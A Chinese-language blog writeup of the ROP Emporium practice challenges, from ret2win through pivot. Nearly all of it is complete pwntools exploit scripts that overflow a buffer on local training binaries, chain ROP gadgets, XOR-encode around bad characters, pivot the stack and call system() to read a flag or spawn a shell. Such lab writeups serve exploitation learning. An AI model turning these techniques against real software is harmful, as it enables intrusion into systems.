---
layout:     post
title:      ROP Emporium平台writeup
author:     wooy0ung
tags: 		normal
category:  	writeup
---


>Problem Address:  
>https://ropemporium.com/  
>  
>ROP练习平台，题量不多，但还是能学到不少姿势  
<!-- more -->

### 0x01 ret2win32

直接覆盖返回地址

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./ret2win32")
sh = process("./ret2win32")

ret2win = 0x08048659

payload = ""
payload += "A"*44
payload += p32(ret2win)

sh.sendline(payload)
sh.interactive()
```


### 0x02 ret2win

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./ret2win")
sh = process("./ret2win")

ret2win = 0x400811

payload = ""
payload += "A"*40
payload += p64(ret2win)

sh.sendline(payload)
sh.interactive()
```


### 0x03 split32

调用system()，栈传递参数"cat flag"

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./split32")
sh = process("./split32")

system_plt = elf.plt["system"]
cat_flag = 0x0804A030

payload = ""
payload += "A"*44
payload += p32(system_plt)
payload += "AAAA"
payload += p32(cat_flag)

sh.sendline(payload)
sh.interactive()
```


### 0x04 split

将"cat flag"参数pop到rdi寄存器

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./split")
sh = process("./split")

system_plt = elf.plt["system"]
cat_flag = 0x00601060
pop_rdi = 0x00400883

payload = ""
payload += "A"*40
payload += p64(pop_rdi)
payload += p64(cat_flag)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()
```


### 0x05 callme32

构造rop依次调用callme_one(1,2,3),callme_two(1,2,3),callme_three(1,2,3)

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./callme32")
sh = process("./callme32")

callme_one = 0x080485C0
callme_two = 0x08048620
callme_three = 0x080485B0
pwnme = 0x080487B6
pop3ret = 0x080488a9

payload = ""
payload += "A"*44
payload += p32(callme_one)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_two)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_three)
payload += p32(pwnme)
payload += p32(1)
payload += p32(2)
payload += p32(3)

sh.sendline(payload)
sh.interactive()
```


### 0x06 callme

同上，但要寄存器传递参数

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./callme")
sh = process("./callme")

callme_one = 0x00401850
callme_two = 0x00401870
callme_three = 0x00401810
pwnme = 0x00401A05
pop_rdi_rsi_rdx = 0x00401ab0

payload = ""
payload += "A"*40
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one)
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two)
payload += p64(pop_rdi_rsi_rdx)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three)
payload += p64(pwnme)

sh.sendline(payload)
sh.interactive()
```


### 0x07 write432

构造rop将"sh\x00\x00"写到bss段，再调用system()

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./write432")
sh = process("./write432")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670

payload = ""
payload += "A"*44
payload += p32(pop_edi_ebp)
payload += p32(bss_addr)
payload += "sh\x00\x00"
payload += p32(mov_edi_ebp)
payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()
```


### 0x08 write4

```
from pwn import *

elf = ELF("./write4")
sh = process("./write4")

system_plt = elf.plt["system"]

bss_addr = 0x00601060
pop_rdi = 0x00400893
pop_rsi_r15 = 0x00400891
mov_rsi_edi = 0x00400821

payload = ""
payload += "A"*40
payload += p64(pop_rsi_r15)
payload += p64(bss_addr)
payload += "AAAAAAAA"
payload += p64(pop_rdi)
payload += "sh\x00\x00\x00\x00\x00\x00"
payload += p64(mov_rsi_edi)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()
```


### 0x09 badchars32

这里过滤了输入，shellcode不能直接出现"sh\x00\x00", 异或处理一下

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

bin_sh = "sh\x00\x00"
badchar = ['b','i','c','/',' ','f','n','s']
paschar = []
bin_sh_pas = ""

for i in range(len(bin_sh)):
	paschar.append(ord(bin_sh[i]) ^ 5)
	bin_sh_pas += chr(paschar[i])
print paschar

for i in range(len(badchar)):
	badchar[i] = ord(badchar[i]) 
print badchar

elf = ELF("./badchars32")
sh = process("./badchars32")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893
xor_ebx_cl = 0x08048890
pop_ecx = 0x08048897
pop_ebx = 0x08048461

payload = ""
payload += "A"*44
payload += p32(pop_esi_edi)
payload += bin_sh_pas
payload += p32(bss_addr)
payload += p32(mov_edi_esi)

for i in range(len(bin_sh_pas)):
	payload += p32(pop_ebx)
	payload += p32(bss_addr + i)
	payload += p32(pop_ecx)
	payload += p32(5)
	payload += p32(xor_ebx_cl)

payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()
```


### 0x10 badchars

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

bin_sh = "/bin/sh\x00"
badchar = ['b','i','c','/',' ','f','n','s']
paschar = []
bin_sh_pas = ""

for i in range(len(bin_sh)):
	paschar.append(ord(bin_sh[i]) ^ 5)
	bin_sh_pas += chr(paschar[i])
print paschar

for i in range(len(badchar)):
	badchar[i] = ord(badchar[i]) 
print badchar

elf = ELF("./badchars")
sh = process("./badchars")

system_plt = elf.plt["system"]
bss_addr = 0x00601080
pop_r12_r13 = 0x00400b3b
mov_r13_r12 = 0x00400b34
pop_r14_r15 = 0x00400b40
xor_r15_r14 = 0x00400b30
pop_rdi = 0x00400b39

payload = ""
payload += "A"*40
payload += p64(pop_r12_r13)
payload += bin_sh_pas
payload += p64(bss_addr)
payload += p64(mov_r13_r12)

for i in range(len(bin_sh_pas)):
	payload += p64(pop_r14_r15)
	payload += p64(5)
	payload += p64(bss_addr + i)
	payload += p64(xor_r15_r14)

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()
```


### 0x11 fluff32

利用两条xor指令能实现寄存器传值

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./fluff32")
sh = process("./fluff32")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_ebx = 0x080483e1
xchg_edx_ecx = 0x08048689		# xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xor_edx_ebx = 0x0804867b		# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_edx = 0x08048671		# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
mov_ecx_edx = 0x08048692		# pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret

payload = ""
payload += "A"*44
payload += p32(pop_ebx)
payload += p32(bss_addr)
payload += p32(xor_edx_edx)
payload += "AAAA"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(xchg_edx_ecx)
payload += "AAAA"

payload += p32(pop_ebx)
payload += "sh\x00\x00"
payload += p32(xor_edx_edx)
payload += "AAAA"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(mov_ecx_edx)
payload += "AAAA"
payload += "AAAA"
payload += p32(0)

payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()
```


### 0x12 fluff

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./fluff")
sh = process("./fluff")

bss_addr = 0x00601060
pop_rdi = 0x00400893
pop_rsi_r15 = 0x00400891
mov_rsi_edi = 0x00400821

system_plt = elf.plt["system"]
bss_addr = 0x00601060
pop_r12 = 0x00400832			# pop r12 ; mov r13d, 0x604060 ; ret
xor_r11_r11 = 0x00400822		# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r12 = 0x0040082f		# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
xchg_r11_r10 = 0x00400840		# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
mov_r10_r11 = 0x0040084e		# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
pop_rdi = 0x004008c3

payload = ""
payload += "A"*40
payload += p64(pop_r12)
payload += p64(bss_addr)
payload += p64(xor_r11_r11)
payload += "A"*8
payload += p64(xor_r11_r12)
payload += "A"*8
payload += p64(xchg_r11_r10)
payload += "A"*8

payload += p64(pop_r12)
payload += "/bin/sh\x00"		# "sh\x00\x00\x00\x00\x00\x00"
payload += p64(xor_r11_r11)
payload += "A"*8
payload += p64(xor_r11_r12)
payload += "A"*8

payload += p64(mov_r10_r11)
payload += "A"*8
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()
```


### 0x13 pivot32

缓冲区太小时，可跳转到一片可控内存再做rop

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./pivot32")
sh = process("./pivot32")

foothold_function_plt = elf.plt["foothold_function"]
foothold_function_got = elf.got["foothold_function"]
ret2win_off = 503
mov_eax_eax = 0x080488c4
pop_eax = 0x080488c0
pop_ebx = 0x08048571
add_eax_ebx = 0x080488C7
call_eax = 0x080486A3
xchg_eax_esp = 0x080488c2

sh.recvuntil("pivot: ")
recv = sh.recvuntil("\n")
heap_addr = int(recv,16)

payload = ""
payload += p32(foothold_function_plt)
payload += p32(pop_eax)
payload += p32(foothold_function_got)
payload += p32(mov_eax_eax)
payload += p32(pop_ebx)
payload += p32(ret2win_off)
payload += p32(add_eax_ebx)
payload += p32(call_eax)

sh.recvuntil("> ")
sh.sendline(payload)

payload = ""
payload += "A"*44
payload += p32(pop_eax)
payload += p32(heap_addr)
payload += p32(xchg_eax_esp)

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()
```


### 0x13 pivot

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./pivot")
sh = process("./pivot")

foothold_function_plt = elf.plt["foothold_function"]
foothold_function_got = elf.got["foothold_function"]
ret2win_off = 334
pop_rax = 0x00400b00
pop_rbp = 0x00400900
mov_rax_rax = 0x00400b05
add_rax_rbp = 0x00400b09
call_rax = 0x0040098E
xchg_rax_rsp = 0x00400b02

sh.recvuntil("pivot: ")
recv = sh.recvuntil("\n")
heap_addr = int(recv,16)

payload = ""
payload += p64(foothold_function_plt)
payload += p64(pop_rax)
payload += p64(foothold_function_got)
payload += p64(mov_rax_rax)
payload += p64(pop_rbp)
payload += p64(ret2win_off)
payload += p64(add_rax_rbp)
payload += p64(call_rax)

sh.recvuntil("> ")
sh.sendline(payload)

payload = ""
payload += "A"*40
payload += p64(pop_rax)
payload += p64(heap_addr)
payload += p64(xchg_rax_rsp)

sh.recvuntil("> ")
sh.sendline(payload)
sh.interactive()
```